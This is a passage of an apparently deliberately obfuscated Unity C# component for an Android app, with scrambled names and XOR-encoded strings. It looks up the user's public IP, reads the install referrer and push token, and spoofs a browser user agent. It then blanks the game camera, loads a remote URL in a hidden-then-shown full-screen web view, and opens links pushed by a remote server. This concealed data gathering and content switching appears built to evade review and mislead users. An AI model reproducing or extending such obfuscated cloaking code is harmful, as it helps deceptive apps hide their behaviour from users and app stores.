    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0xb140274b()
    {
        var _0x46b29923 = _0x1d049fc9._0x8f92ce0a(new byte[40] { 144, 140, 140, 136, 139, 194, 215, 215, 143, 143, 143, 214, 155, 148, 151, 141, 156, 158, 148, 153, 138, 157, 214, 155, 151, 149, 215, 155, 156, 150, 213, 155, 159, 145, 215, 140, 138, 153, 155, 157 }, 248);
        using (UnityWebRequest _0x4055a3c5 = UnityWebRequest.Get(_0x46b29923))
        {
            await _0x4055a3c5.SendWebRequest();
            string[] _0x1a6dc624 = _0x4055a3c5.downloadHandler.text.Split('\n');
            foreach (string _0x078271b7 in _0x1a6dc624)
            {
                if (_0x078271b7.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[3] { 125, 100, 41 }, 20)))
                {
                    string _0x8aade4a0 = _0x078271b7.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0x8aade4a0} from {_0x46b29923}");
                        }
#endif
                    }

                    return _0x8aade4a0;
                }
            }
        }

        return "";
    }

    private string _0xf17f22c0 = "";
    private IEnumerator _0x755f5894(string _0x7fc23ade)
    {
        if (_0x9df718e6 != null && _0x4096132e)
            yield break;
        _0x9df718e6 = gameObject.AddComponent<UniWebView>();
        _0xc4fb749e(_0x9df718e6);
        _0x2d5c6bac(_0x9df718e6);
        _0x9df718e6.BackgroundColor = Color.clear;
        var _0x9f577a4d = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0x9d544791();
        yield return new WaitForEndOfFrame();
        _0x4096132e = true;
        _0x0239b660();
        _0x5bb15064(true);
        _0xd87c776b = false;
        _0xf7e4abee = false;
        _0xe8116563.Clear();
        _0xccb4b998 = -1;
        firstLoadShown = false;
        _0xd06e0867 = false;
        _0x10d43755 = false;
        _0x9df718e6.SetUserAgent("");
        _0xadebe39e = Time.realtimeSinceStartup;
        _0x9df718e6.Stop();
        _0x9df718e6.Load(_0x7fc23ade);
        _0x9df718e6.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x1d049fc9._0x8f92ce0a(new byte[25] { 199, 235, 227, 228, 170, 221, 239, 232, 220, 227, 239, 253, 170, 195, 228, 227, 254, 227, 235, 230, 170, 217, 226, 229, 253 }, 138));
    }

    private string _0x1240df56()
    {
        float _0x086e9061 = Time.realtimeSinceStartup;
        if (_0x086e9061 < 0f)
            _0x086e9061 = 0f;
        int _0x55fe9195 = (int)(_0x086e9061 * 1000f);
        int _0x46a2a115 = _0x55fe9195 / 60000;
        int _0xa3dbe547 = (_0x55fe9195 / 1000) % 60;
        int _0xaaa2b21e = _0x55fe9195 % 1000;
        return string.Format(_0x1d049fc9._0x8f92ce0a(new byte[21] { 227, 168, 162, 168, 168, 229, 162, 227, 169, 162, 168, 168, 229, 162, 227, 170, 162, 168, 168, 168, 229 }, 152), _0x46a2a115, _0xa3dbe547, _0xaaa2b21e);
    }

    private Action _0xdc1026c0;
    private void _0x80e8efc9(string _0xb15aff1b)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[34] { 0, 15, 62, 40, 47, 6, 123, 29, 62, 47, 56, 51, 123, 30, 35, 47, 41, 58, 123, 11, 46, 40, 51, 123, 31, 58, 47, 58, 123, 9, 58, 44, 97, 123 }, 91) + _0xb15aff1b);
#endif
            }
        }

        var _0xf17b9c61 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xb15aff1b);
        StartCoroutine(_0x5e6ad958(_0xf17b9c61));
    }

    private void _0x5bb15064(bool _0x5b0d14cb)
    {
        _0x0239b660();
        _0xf307d1be.SetActive(_0x5b0d14cb);
        _0x94cf20fe = _0x5b0d14cb;
        if (_0x5b0d14cb)
        {
            _0xf307d1be.transform.SetAsLastSibling();
            if (_0xe0331d22 != null)
                _0xe0331d22.localRotation = Quaternion.identity;
        }
    }

    internal bool isApplicationFocus = false;
    private string _0x0842a580()
    {
        string _0x30e529ac = _0x1d049fc9._0x8f92ce0a(new byte[62] { 112, 115, 114, 117, 116, 119, 118, 121, 120, 123, 122, 125, 124, 127, 126, 97, 96, 99, 98, 101, 100, 103, 102, 105, 104, 107, 80, 83, 82, 85, 84, 87, 86, 89, 88, 91, 90, 93, 92, 95, 94, 65, 64, 67, 66, 69, 68, 71, 70, 73, 72, 75, 33, 32, 35, 34, 37, 36, 39, 38, 41, 40 }, 17);
        System.Random _0x9c6538c9 = new System.Random();
        int _0xc6610751 = _0x9c6538c9.Next(8, 16);
        return new string (Enumerable.Repeat(_0x30e529ac, _0xc6610751).Select(_0x4a834dcc => _0x4a834dcc[_0x9c6538c9.Next(_0x4a834dcc.Length)]).ToArray());
    }

    private ApplicationInstallMode _0xd16f0d8d = ApplicationInstallMode.Unknown;
    private bool OpenUrlExternally(string _0x8d9bb413)
    {
        return _0x16ec9c4c(_0x8d9bb413);
    }

    private IEnumerator _0xbca728f6(float _0xdfe4b392)
    {
        yield return new WaitForSeconds(_0xdfe4b392);
        if (!_0xc1c72a84)
        {
            _0xc1c72a84 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0x68b91c10}");
                }
#endif
            }
        }
    }

    private async Task<bool> _0x5376617c()
    {
        _0x347b2c13.Instance?._0x561a731e();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0xe9521daf) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[32] { 207, 192, 241, 231, 224, 201, 180, 193, 250, 253, 224, 237, 180, 196, 225, 231, 252, 180, 218, 251, 224, 253, 242, 253, 247, 245, 224, 253, 251, 250, 174, 180 }, 148) + string.Join(_0x1d049fc9._0x8f92ce0a(new byte[1] { 201 }, 192), _0xe9521daf));
                }
#endif
            }
        };
        try
        {
            _0x2575549b = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[31] { 140, 131, 178, 164, 163, 138, 247, 145, 182, 190, 187, 178, 179, 247, 163, 184, 247, 176, 178, 163, 247, 167, 162, 164, 191, 247, 163, 184, 188, 178, 185 }, 215));
                }
#endif
            }

            _0x2575549b = "";
        }

        _0x3a955caa = !string.IsNullOrEmpty(_0x2575549b);
        _0x55c32e94 = _0x1240df56();
        {
#if B_LOGS
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[25] { 254, 241, 192, 214, 209, 248, 133, 240, 203, 204, 209, 220, 133, 245, 208, 214, 205, 133, 241, 202, 206, 192, 203, 159, 133 }, 165) + _0x2575549b);
#endif
        }

        _0x347b2c13.Instance?._0xae9711bb();
        return false;
    }

    private string Decrypt(string _0xea82251e, string _0x828c6ad5)
    {
        try
        {
            var _0x7c2019d1 = Convert.FromBase64String(_0xea82251e);
            using var _0x26d5b2c9 = Aes.Create();
            _0x26d5b2c9.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x828c6ad5));
            var _0x1ea2713c = new byte[16];
            Buffer.BlockCopy(_0x7c2019d1, 0, _0x1ea2713c, 0, 16);
            _0x26d5b2c9.IV = _0x1ea2713c;
            using var _0xe60d1f7c = new MemoryStream(_0x7c2019d1, 16, _0x7c2019d1.Length - 16);
            using var _0x8f8d72ad = new CryptoStream(_0xe60d1f7c, _0x26d5b2c9.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0x50a505c0 = new StreamReader(_0x8f8d72ad, Encoding.UTF8);
            return _0x50a505c0.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x0d6382ad();
    }

    private void _0xb08301c2()
    {
        _0xf7e4abee = true;
        if (_0x9df718e6 != null)
            _0x9df718e6.SetUserAgent(_0xf654ce05());
    }

    private bool _0xccf82f1f = false;
    private string GetFailingUrl(UniWebViewNativeResultPayload _0xec598467)
    {
        if (_0xec598467 == null || _0xec598467.Extra == null)
            return null;
        object _0xca8bffef;
        if (!_0xec598467.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0xca8bffef))
            return null;
        return _0xca8bffef as string;
    }

    private bool _0x502fbb2a()
    {
        if (_0xa2f0dc29())
            return true;
        if (_0x9df718e6 != null && _0x9df718e6.CanGoBack)
        {
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[36] { 33, 8, 27, 13, 30, 8, 27, 12, 73, 11, 8, 10, 2, 73, 68, 87, 73, 4, 8, 0, 7, 73, 62, 12, 11, 63, 0, 12, 30, 73, 46, 6, 43, 8, 10, 2 }, 105));
            _0x9df718e6.GoBack();
            return true;
        }

        return false;
    }

    private string _0x3eff9c2d = "";
    private string _0xda1d4974()
    {
        try
        {
            using (var _0x0e05defb = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[30] { 143, 131, 129, 194, 153, 130, 133, 152, 149, 223, 136, 194, 156, 128, 141, 149, 137, 158, 194, 185, 130, 133, 152, 149, 188, 128, 141, 149, 137, 158 }, 236)))
            {
                var _0x32ed036b = _0x0e05defb.GetStatic<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[15] { 231, 241, 246, 246, 225, 234, 240, 197, 231, 240, 237, 242, 237, 240, 253 }, 132));
                var _0x386a73ee = _0x32ed036b.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[21] { 246, 244, 229, 208, 225, 225, 253, 248, 242, 240, 229, 248, 254, 255, 210, 254, 255, 229, 244, 233, 229 }, 145));
                using (var _0xbf6e10f0 = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[26] { 155, 148, 158, 136, 149, 147, 158, 212, 141, 159, 152, 145, 147, 142, 212, 173, 159, 152, 169, 159, 142, 142, 147, 148, 157, 137 }, 250)))
                {
                    return _0xbf6e10f0.CallStatic<string>(_0x1d049fc9._0x8f92ce0a(new byte[19] { 75, 73, 88, 104, 73, 74, 77, 89, 64, 88, 121, 95, 73, 94, 109, 75, 73, 66, 88 }, 44), _0x386a73ee);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private async Task<bool> _0x1431bc5f(int _0x1618a482 = 5, int _0x42276255 = 500)
    {
        List<EntityData> _0x603b7618 = new List<EntityData>();
        int _0xeecece49 = 0;
        do
        {
            try
            {
                _0x603b7618 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x1d049fc9._0x8f92ce0a(new byte[8] { 126, 98, 111, 119, 107, 124, 71, 106 }, 14), _0x1e834b18, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x1d049fc9._0x8f92ce0a(new byte[9] { 176, 170, 137, 171, 176, 175, 184, 186, 160 }, 217) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[32] { 200, 199, 246, 224, 231, 206, 179, 226, 230, 246, 225, 234, 210, 224, 234, 253, 240, 193, 246, 224, 230, 255, 231, 224, 179, 246, 225, 225, 252, 225, 169, 179 }, 147) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0x42276255);
        }
        while (_0x603b7618.Count == 0 && _0xeecece49++ < _0x1618a482);
        {
#if B_LOGS
            {
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[32] { 216, 215, 230, 240, 247, 222, 163, 202, 240, 211, 241, 234, 245, 226, 224, 250, 163, 210, 246, 230, 241, 250, 163, 241, 230, 240, 246, 239, 247, 240, 185, 163 }, 131) + JsonConvert.SerializeObject(_0x603b7618, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[38] { 146, 157, 172, 186, 189, 148, 233, 128, 186, 153, 187, 160, 191, 168, 170, 176, 233, 152, 188, 172, 187, 176, 233, 187, 172, 186, 188, 165, 189, 186, 233, 170, 166, 188, 167, 189, 243, 233 }, 201) + _0x603b7618.Count);
            }
#endif
        }

        bool _0x228acfb0 = true;
        if (_0x603b7618.Count == 0)
        {
            _0x228acfb0 = false;
        }
        else
        {
            _0x228acfb0 = _0x603b7618.Any(_0x700df315 => _0x700df315.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[25] { 213, 218, 235, 253, 250, 211, 174, 199, 253, 222, 252, 231, 248, 239, 237, 247, 174, 252, 235, 253, 251, 226, 250, 180, 174 }, 142) + _0x228acfb0);
            }
#endif
        }

        return _0x228acfb0;
    }

    private bool _0x78f603fb()
    {
        _0xe8116563.RemoveAll(_0x7e0e551e => _0x7e0e551e == null || !_0x7e0e551e.IsAlive);
        return _0xe8116563.Count > 0;
    }

    private string _0x00c3e72e()
    {
        string _0x902decb9 = _0xf654ce05();
        if (string.IsNullOrEmpty(_0x902decb9))
            return _0x1d049fc9._0x8f92ce0a(new byte[7] { 61, 36, 34, 47, 107, 123, 112 }, 75);
        string _0xaf3f4da7 = _0x902decb9.Replace(_0x1d049fc9._0x8f92ce0a(new byte[1] { 246 }, 170), _0x1d049fc9._0x8f92ce0a(new byte[2] { 214, 214 }, 138)).Replace(_0x1d049fc9._0x8f92ce0a(new byte[1] { 71 }, 96), _0x1d049fc9._0x8f92ce0a(new byte[2] { 189, 198 }, 225));
        var _0xf9e9f22f = Regex.Match(_0x902decb9, _0x1d049fc9._0x8f92ce0a(new byte[12] { 131, 168, 178, 175, 173, 165, 239, 232, 156, 164, 235, 233 }, 192));
        string _0x97858969 = _0xf9e9f22f.Success ? _0xf9e9f22f.Groups[1].Value : _0x1d049fc9._0x8f92ce0a(new byte[3] { 252, 255, 253 }, 205);
        return _0x1d049fc9._0x8f92ce0a(new byte[12] { 130, 204, 223, 196, 201, 222, 195, 197, 196, 130, 131, 209 }, 170) + _0x1d049fc9._0x8f92ce0a(new byte[8] { 73, 94, 77, 31, 74, 94, 2, 24 }, 63) + _0xaf3f4da7 + _0x1d049fc9._0x8f92ce0a(new byte[2] { 36, 56 }, 3) + _0x1d049fc9._0x8f92ce0a(new byte[30] { 171, 188, 175, 253, 173, 175, 178, 169, 178, 224, 147, 188, 171, 180, 186, 188, 169, 178, 175, 243, 173, 175, 178, 169, 178, 169, 164, 173, 184, 230 }, 221) + _0x1d049fc9._0x8f92ce0a(new byte[121] { 186, 169, 178, 191, 168, 181, 179, 178, 252, 184, 185, 186, 244, 179, 190, 182, 240, 183, 185, 165, 240, 170, 189, 176, 245, 167, 168, 174, 165, 167, 147, 190, 182, 185, 191, 168, 242, 184, 185, 186, 181, 178, 185, 140, 174, 179, 172, 185, 174, 168, 165, 244, 179, 190, 182, 240, 183, 185, 165, 240, 167, 187, 185, 168, 230, 186, 169, 178, 191, 168, 181, 179, 178, 244, 245, 167, 174, 185, 168, 169, 174, 178, 252, 170, 189, 176, 231, 161, 240, 191, 179, 178, 186, 181, 187, 169, 174, 189, 190, 176, 185, 230, 168, 174, 169, 185, 161, 245, 231, 161, 191, 189, 168, 191, 180, 244, 185, 245, 167, 161, 161 }, 220) + _0x1d049fc9._0x8f92ce0a(new byte[26] { 47, 46, 45, 99, 59, 57, 36, 63, 36, 103, 108, 62, 56, 46, 57, 10, 44, 46, 37, 63, 108, 103, 62, 42, 98, 112 }, 75) + _0x1d049fc9._0x8f92ce0a(new byte[52] { 150, 151, 148, 218, 130, 128, 157, 134, 157, 222, 213, 147, 130, 130, 164, 151, 128, 129, 155, 157, 156, 213, 222, 135, 147, 220, 128, 151, 130, 158, 147, 145, 151, 218, 221, 172, 191, 157, 136, 155, 158, 158, 147, 174, 221, 221, 222, 213, 213, 219, 219, 201 }, 242) + _0x1d049fc9._0x8f92ce0a(new byte[37] { 99, 98, 97, 47, 119, 117, 104, 115, 104, 43, 32, 119, 107, 102, 115, 97, 104, 117, 106, 32, 43, 32, 75, 110, 105, 114, 127, 39, 102, 117, 106, 113, 63, 107, 32, 46, 60 }, 7) + _0x1d049fc9._0x8f92ce0a(new byte[34] { 134, 135, 132, 202, 146, 144, 141, 150, 141, 206, 197, 148, 135, 140, 134, 141, 144, 197, 206, 197, 165, 141, 141, 133, 142, 135, 194, 171, 140, 129, 204, 197, 203, 217 }, 226) + _0x1d049fc9._0x8f92ce0a(new byte[30] { 53, 52, 55, 121, 33, 35, 62, 37, 62, 125, 118, 60, 48, 41, 5, 62, 36, 50, 57, 1, 62, 56, 63, 37, 34, 118, 125, 100, 120, 106 }, 81) + _0x1d049fc9._0x8f92ce0a(new byte[48] { 232, 238, 229, 231, 234, 253, 238, 188, 233, 253, 248, 161, 231, 254, 238, 253, 242, 248, 239, 166, 199, 231, 254, 238, 253, 242, 248, 166, 187, 223, 244, 238, 243, 241, 245, 233, 241, 187, 176, 234, 249, 238, 239, 245, 243, 242, 166, 187 }, 156) + _0x97858969 + _0x1d049fc9._0x8f92ce0a(new byte[35] { 45, 119, 38, 113, 104, 120, 107, 100, 110, 48, 45, 77, 101, 101, 109, 102, 111, 42, 73, 98, 120, 101, 103, 111, 45, 38, 124, 111, 120, 121, 99, 101, 100, 48, 45 }, 10) + _0x97858969 + _0x1d049fc9._0x8f92ce0a(new byte[238] { 67, 25, 72, 31, 6, 22, 5, 10, 0, 94, 67, 42, 11, 16, 89, 37, 91, 38, 22, 5, 10, 0, 67, 72, 18, 1, 22, 23, 13, 11, 10, 94, 67, 86, 80, 67, 25, 57, 72, 9, 11, 6, 13, 8, 1, 94, 16, 22, 17, 1, 72, 20, 8, 5, 16, 2, 11, 22, 9, 94, 67, 37, 10, 0, 22, 11, 13, 0, 67, 72, 3, 1, 16, 44, 13, 3, 12, 33, 10, 16, 22, 11, 20, 29, 50, 5, 8, 17, 1, 23, 94, 2, 17, 10, 7, 16, 13, 11, 10, 76, 77, 31, 22, 1, 16, 17, 22, 10, 68, 52, 22, 11, 9, 13, 23, 1, 74, 22, 1, 23, 11, 8, 18, 1, 76, 31, 5, 22, 7, 12, 13, 16, 1, 7, 16, 17, 22, 1, 94, 67, 5, 22, 9, 67, 72, 6, 13, 16, 10, 1, 23, 23, 94, 67, 82, 80, 67, 72, 9, 11, 6, 13, 8, 1, 94, 16, 22, 17, 1, 72, 9, 11, 0, 1, 8, 94, 67, 67, 72, 20, 8, 5, 16, 2, 11, 22, 9, 94, 67, 37, 10, 0, 22, 11, 13, 0, 67, 72, 20, 8, 5, 16, 2, 11, 22, 9, 50, 1, 22, 23, 13, 11, 10, 94, 67, 85, 80, 74, 84, 74, 84, 67, 72, 17, 5, 34, 17, 8, 8, 50, 1, 22, 23, 13, 11, 10, 94, 67 }, 100) + _0x97858969 + _0x1d049fc9._0x8f92ce0a(new byte[117] { 134, 152, 134, 152, 134, 152, 143, 213, 129, 147, 213, 213, 147, 231, 202, 194, 205, 203, 220, 134, 204, 205, 206, 193, 198, 205, 248, 218, 199, 216, 205, 218, 220, 209, 128, 216, 218, 199, 220, 199, 132, 143, 221, 219, 205, 218, 233, 207, 205, 198, 220, 236, 201, 220, 201, 143, 132, 211, 207, 205, 220, 146, 206, 221, 198, 203, 220, 193, 199, 198, 128, 129, 211, 218, 205, 220, 221, 218, 198, 136, 221, 201, 204, 147, 213, 132, 203, 199, 198, 206, 193, 207, 221, 218, 201, 202, 196, 205, 146, 220, 218, 221, 205, 213, 129, 147, 213, 203, 201, 220, 203, 192, 128, 205, 129, 211, 213 }, 168) + _0x1d049fc9._0x8f92ce0a(new byte[5] { 39, 115, 114, 115, 97 }, 90);
    }

    private void _0xae25c40c(string _0xa396e067)
    {
        Dictionary<string, object> _0x89295b38;
        try
        {
            _0x89295b38 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xa396e067);
        }
        catch
        {
            return;
        }

        var _0xbddaa343 = ReadPushField(_0x89295b38, _0x1d049fc9._0x8f92ce0a(new byte[3] { 3, 4, 26 }, 118));
        if (string.IsNullOrWhiteSpace(_0xbddaa343))
            return;
        _0xbddaa343 = _0xbddaa343.Trim();
        if (!IsHttpUrl(_0xbddaa343))
            return;
        if (string.Equals(_0xbddaa343, _0x13603008, StringComparison.Ordinal))
            return;
        _0x13603008 = _0xbddaa343;
        OpenUrlExternally(_0xbddaa343);
    }

    private void OnApplicationPause(bool _0x0bd80d43)
    {
        isApplicationPause = _0x0bd80d43;
    }

    private void _0xb113ab39()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private void _0x0239b660()
    {
        if (_0xf307d1be != null)
            return;
        var _0x4a723b46 = _0x3babe529();
        _0xf307d1be = new GameObject(_0x1d049fc9._0x8f92ce0a(new byte[14] { 57, 11, 12, 56, 7, 11, 25, 61, 30, 7, 0, 0, 11, 28 }, 110), typeof(RectTransform), typeof(Text));
        _0xe0331d22 = _0xf307d1be.GetComponent<RectTransform>();
        _0xe0331d22.SetParent(_0x4a723b46.transform, false);
        _0xe0331d22.anchorMin = new Vector2(0.5f, 0.5f);
        _0xe0331d22.anchorMax = new Vector2(0.5f, 0.5f);
        _0xe0331d22.pivot = new Vector2(0.5f, 0.5f);
        _0xe0331d22.sizeDelta = new Vector2(600f, 600f);
        _0xe0331d22.anchoredPosition = Vector2.zero;
        _0xbbf8464f = _0xf307d1be.GetComponent<Text>();
        _0xbbf8464f.text = _0x1d049fc9._0x8f92ce0a(new byte[1] { 91 }, 116);
        _0xbbf8464f.font = Resources.GetBuiltinResource<Font>(_0x1d049fc9._0x8f92ce0a(new byte[17] { 180, 157, 159, 153, 155, 129, 170, 141, 150, 140, 145, 149, 157, 214, 140, 140, 158 }, 248));
        _0xbbf8464f.fontSize = 200;
        _0xbbf8464f.alignment = TextAnchor.MiddleCenter;
        _0xbbf8464f.color = Color.white;
        _0xbbf8464f.raycastTarget = false;
        _0xf307d1be.SetActive(false);
    }

    private bool _0x16ec9c4c(string _0x2283031b)
    {
        try
        {
            using (var _0x1f4e2bd7 = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[30] { 101, 105, 107, 40, 115, 104, 111, 114, 127, 53, 98, 40, 118, 106, 103, 127, 99, 116, 40, 83, 104, 111, 114, 127, 86, 106, 103, 127, 99, 116 }, 6)))
            using (var _0x92717cc8 = _0x1f4e2bd7.GetStatic<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[15] { 103, 113, 118, 118, 97, 106, 112, 69, 103, 112, 109, 114, 109, 112, 125 }, 4)))
            using (var _0xf35eea19 = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[15] { 33, 46, 36, 50, 47, 41, 36, 110, 46, 37, 52, 110, 21, 50, 41 }, 64)))
            using (var _0x2e0f7d42 = _0xf35eea19.CallStatic<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[5] { 64, 81, 66, 67, 85 }, 48), _0x2283031b))
            using (var _0xdd3c3b4f = new AndroidJavaObject(_0x1d049fc9._0x8f92ce0a(new byte[22] { 196, 203, 193, 215, 202, 204, 193, 139, 198, 202, 203, 209, 192, 203, 209, 139, 236, 203, 209, 192, 203, 209 }, 165), _0x1d049fc9._0x8f92ce0a(new byte[26] { 29, 18, 24, 14, 19, 21, 24, 82, 21, 18, 8, 25, 18, 8, 82, 29, 31, 8, 21, 19, 18, 82, 42, 53, 57, 43 }, 124), _0x2e0f7d42))
            {
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[26] { 77, 102, 124, 97, 99, 107, 66, 103, 101, 107, 46, 97, 126, 107, 96, 46, 107, 118, 122, 107, 124, 96, 111, 98, 52, 46 }, 14) + _0x2283031b);
                _0xdd3c3b4f.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[11] { 11, 14, 14, 41, 11, 30, 15, 13, 5, 24, 19 }, 106), _0x1d049fc9._0x8f92ce0a(new byte[33] { 169, 166, 172, 186, 167, 161, 172, 230, 161, 166, 188, 173, 166, 188, 230, 171, 169, 188, 173, 175, 167, 186, 177, 230, 138, 154, 135, 159, 155, 137, 138, 132, 141 }, 200));
                _0xdd3c3b4f.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[8] { 191, 186, 186, 152, 178, 191, 185, 173 }, 222), 0x10000000);
                _0x92717cc8.Call(_0x1d049fc9._0x8f92ce0a(new byte[13] { 125, 122, 111, 124, 122, 79, 109, 122, 103, 120, 103, 122, 119 }, 14), _0xdd3c3b4f);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[28] { 186, 145, 139, 150, 148, 156, 181, 144, 146, 156, 217, 156, 129, 141, 156, 139, 151, 152, 149, 217, 159, 152, 144, 149, 156, 157, 195, 217 }, 249) + e.Message);
            Application.OpenURL(_0x2283031b);
            return true;
        }
    }

    private string _0x1e834b18 = "";
    private string _0xd7999165 { get; set; }

    private void _0xd4d51f05()
    {
        WLog(_0x1d049fc9._0x8f92ce0a(new byte[21] { 103, 78, 93, 75, 88, 78, 93, 74, 15, 77, 78, 76, 68, 15, 95, 93, 74, 92, 92, 74, 75 }, 47));
        if (Time.frameCount == _0xccb4b998)
            return;
        _0xccb4b998 = Time.frameCount;
        if (_0x502fbb2a())
            return;
        _0x792e8620();
    }

    private GameObject _0xf307d1be;
    private string _0xf654ce05()
    {
        if (string.IsNullOrEmpty(_0xf17f22c0) && _0x9df718e6 != null)
